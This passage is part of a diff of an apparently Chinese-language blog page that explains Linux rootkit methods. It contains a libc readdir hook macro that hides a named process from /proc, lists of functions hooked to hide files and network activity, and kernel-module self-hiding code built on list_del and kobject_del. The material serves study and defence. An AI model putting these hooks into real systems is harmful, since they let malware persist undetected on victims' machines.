class="string">\</span></span><br><span class="line">    struct dirent* dir;                                                 <span class="string">\</span></span><br><span class="line">                                                                        <span class="string">\</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)                                                            <span class="string">\</span></span><br><span class="line">    &#123;                                                                   <span class="string">\</span></span><br><span class="line">        dir = original_<span class="comment">##readdir(dirp);                                 \</span></span><br><span class="line">        <span class="keyword">if</span>(dir) &#123;                                                       <span class="string">\</span></span><br><span class="line">            char dir_name[<span class="number">256</span>];                                         <span class="string">\</span></span><br><span class="line">            char process_name[<span class="number">256</span>];                                     <span class="string">\</span></span><br><span class="line">            <span class="keyword">if</span>(get_dir_name(dirp, dir_name, sizeof(dir_name)) &amp;&amp;        <span class="string">\</span></span><br><span class="line">                strcmp(dir_name, <span class="string">"/proc"</span>) == <span class="number">0</span> &amp;&amp;                       <span class="string">\</span></span><br><span class="line">                get_process_name(dir-&gt;d_name, process_name) &amp;&amp;          <span class="string">\</span></span><br><span class="line">                strcmp(process_name, process_to_filter) == <span class="number">0</span>) &#123;         <span class="string">\</span></span><br><span class="line">                <span class="keyword">continue</span>;                                               <span class="string">\</span></span><br><span class="line">            &#125;                                                           <span class="string">\</span></span><br><span class="line">        &#125;                                                               <span class="string">\</span></span><br><span class="line">        <span class="keyword">break</span>;                                                          <span class="string">\</span></span><br><span class="line">    &#125;                                                                   <span class="string">\</span></span><br><span class="line">    <span class="keyword">return</span> dir;                                                         <span class="string">\</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这边hook了libc中的readdir，用来对应用程序调readdir解析vfs数据显示的进程进行过滤，尾部同lkm，返回时执行原生函数逻辑。</p>
 <h3 id="通用的rootkit攻击手法"><a href="#通用的rootkit攻击手法" class="headerlink" title="通用的rootkit攻击手法"></a>通用的rootkit攻击手法</h3><p>常见rootkit涉及的攻击面：</p>
 <p>1、进程</p>
 <p>2、文件</p>
@@ -543,31 +423,19 @@ struct dirent* readdir(DIR *dirp)                                       \
 <p>用户态可以通过hook execv、execl、execle、execlp、execvp、fexecve等api劫持进程执行流程，达到程序执行的恶意重定向效果；针对一些hids通过hook execve等函数收集进程创建信息的行为，可以通过覆写execve进行bypass；lkm可以通过unlink task_struct节点达到进程隐藏的效果等等。</p>
 <p><strong>文件</strong></p>
 <p>用户态可以通过覆写readdir、unlink、access等函数对文件的读、写、执行进行控制，从而达到文件隐藏、进程（文件）执行控制、文件禁删除等效果，方便攻击者的后门程序可以非常顺利的在受害者主机驻留并难以被发现、清除；内核态一般hook getdents/getdents64两个系统调用。</p>
-<pre><code>usermode:
-readdir、chdir、fchdir、mkdir、rmdir、opendir    ...
-link、unlink、unlinkat、symlink    ...
-access、open、openat、fopen    ...
-create、fputs、fwrite    ...
-fread    ...
-kernelmode:
-getdents/getdents64    ...</code></pre><p><strong>网络</strong></p>
-<p>一般做主机/端口隐藏或者流量嗅探，常用hook函数：</p>
-<pre><code>socket、connect、accept    ...
-getservbyname、getservbyport、getservent    ...</code></pre><p><strong>自身隐藏</strong></p>
-<pre><code>kernel mode:
-/proc/kallsyms &amp;&amp; /sys/module/
-list_del_init &amp;&amp; kobject_del
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">usermode:</span><br><span class="line"><span class="keyword">readdir</span>、<span class="keyword">chdir</span>、fchdir、<span class="keyword">mkdir</span>、<span class="keyword">rmdir</span>、<span class="keyword">opendir</span>	...</span><br><span class="line"><span class="keyword">link</span>、<span class="keyword">unlink</span>、unlinkat、<span class="keyword">symlink</span>	...</span><br><span class="line">access、<span class="keyword">open</span>、openat、fopen	...</span><br><span class="line">create、fputs、fwrite	...</span><br><span class="line">fread	...</span><br><span class="line">kernelmode:</span><br><span class="line">getdents/getdents64	...</span><br></pre></td></tr></table></figure>
 
-user mode:
-hide ld_preload
-hide evil so
-can’t delete &amp;&amp; watch &amp;&amp; change</code></pre><p>lsmod本身是和ps、top这些程序一样解析/proc的，lsmod的数据来自于解析/proc/modules文件，而vfs中的数据是内核映射并格式化出来的，本质上来源于内核的modules struct内核模块链表，一般来说，常用的方式是在恶意lkm中使用list_del在载入内核后unlink掉内核链表中的此项，这样lsmod就无法查看到存在对应模块信息了；但是/sys/modules中还是能看到对应内核模块信息，个人理解是/proc/kallsyms和/sys/module是来自内核中两条相似的链表，其中一条派生自另一条（后面打算调一下），二者分用与不同功能；一般使用kobject_del删除模块对象之后，/sys/module中就没有对应内核模块信息了；同时，rmmod也无法检测到对应模块的存在，也就无法直接进行卸载；但可通过信号控制在脚本中动态地将内核模块信息加入对应内核模块链表，达到一个完整的控制效果。</p>
-<pre><code>module_show(void)
-{
-        list_add(&amp;THIS_MODULE-&gt;list, module_previous);
-        kobject_add(&amp;THIS_MODULE-&gt;mkobj.kobj, THIS_MODULE-&gt;mkobj.kobj.parent,MODULE_NAME);
-        module_hidden = 0;
-}</code></pre><p>用户态ld_preload本身比较简单，不再赘述。</p>
+<p><strong>网络</strong></p>
+<p>一般做主机/端口隐藏或者流量嗅探，常用hook函数：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">socket</span>、<span class="keyword">connect</span>、<span class="keyword">accept</span>	...</span><br><span class="line"><span class="keyword">getservbyname</span>、<span class="keyword">getservbyport</span>、<span class="keyword">getservent</span>	...</span><br></pre></td></tr></table></figure>
+
+<p><strong>自身隐藏</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kernel mode:</span><br><span class="line">/proc/kallsyms &amp;&amp; /sys/module/</span><br><span class="line">list_del_init &amp;&amp; kobject_del</span><br><span class="line"></span><br><span class="line">user mode:</span><br><span class="line">hide ld_preload</span><br><span class="line">hide evil so</span><br><span class="line">can’t delete &amp;&amp; watch &amp;&amp; change</span><br></pre></td></tr></table></figure>
+
+<p>lsmod本身是和ps、top这些程序一样解析/proc的，lsmod的数据来自于解析/proc/modules文件，而vfs中的数据是内核映射并格式化出来的，本质上来源于内核的modules struct内核模块链表，一般来说，常用的方式是在恶意lkm中使用list_del在载入内核后unlink掉内核链表中的此项，这样lsmod就无法查看到存在对应模块信息了；但是/sys/modules中还是能看到对应内核模块信息，个人理解是/proc/kallsyms和/sys/module是来自内核中两条相似的链表，其中一条派生自另一条（后面打算调一下），二者分用与不同功能；一般使用kobject_del删除模块对象之后，/sys/module中就没有对应内核模块信息了；同时，rmmod也无法检测到对应模块的存在，也就无法直接进行卸载；但可通过信号控制在脚本中动态地将内核模块信息加入对应内核模块链表，达到一个完整的控制效果。</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span><span class="constructor">_show(<span class="params">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">list</span><span class="constructor">_add(&amp;THIS_MODULE-&gt;<span class="params">list</span>, <span class="params">module_previous</span>)</span>;</span><br><span class="line">        kobject<span class="constructor">_add(&amp;THIS_MODULE-&gt;<span class="params">mkobj</span>.<span class="params">kobj</span>, THIS_MODULE-&gt;<span class="params">mkobj</span>.<span class="params">kobj</span>.<span class="params">parent</span>,MODULE_NAME)</span>;</span><br><span class="line">        module_hidden = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用户态ld_preload本身比较简单，不再赘述。</p>
 <p><strong>else &amp; more</strong></p>
 <p><img src="./image-20200911033112456.png" alt="image-20200911033112456"></p>
 <p>rootkit的利用手法并不只限于隐藏，linux原生功能可以做的，它同样能做；一些较好的开源项目对大量linux常用的api进行了分类并预留接口，由使用者进行逻辑的自定义和利用。</p>
@@ -702,8 +570,6 @@ can’t delete &amp;&amp; watch &amp;&amp; change</code></pre><p>lsmod本身是�
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
